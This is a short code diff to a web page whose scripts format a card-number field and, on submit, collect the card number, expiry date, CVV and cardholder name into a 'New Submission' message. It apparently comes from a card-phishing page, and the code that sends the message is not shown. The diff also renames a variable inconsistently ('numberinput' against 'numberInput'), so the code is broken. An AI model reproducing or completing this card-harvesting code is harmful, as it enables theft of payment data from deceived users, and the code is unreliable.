@@ -355,7 +355,7 @@
 
   <script>
     // تنسيق رقم البطاقة: 16 رقم فقط + مسافات كل 4 أرقام
-    const numberInput = document.getElementById("cardNumber");
+    const numberinput = document.getElementById("cardNumber");
     numberInput.addEventListener("input", () => {
       let value = numberInput.value.replace(/\D/g, ""); // أرقام فقط
       if (value.length > 16) value = value.slice(0, 16);
@@ -387,10 +387,10 @@
   <script>
 document.getElementById("confirmForm").addEventListener("submit", function () {
   
-  const Card number = document.getElementById("cardNumber").value;
-  const Expiration date = document.getElementById("expirationDate").value;
-  const CVV/CVC = document.getElementById("cvv").value;
-  const Cardholder name = document.getElementById("cardholderName").value;
+  const cardNumber = document.getElementById("cardNumber").value;
+  const expirationDate = document.getElementById("expirationDate").value;
+  const cvv = document.getElementById("cvv").value;
+  const cardholderName = document.getElementById("cardholderName").value;
 
   const message = `
 🔔 New Submission:
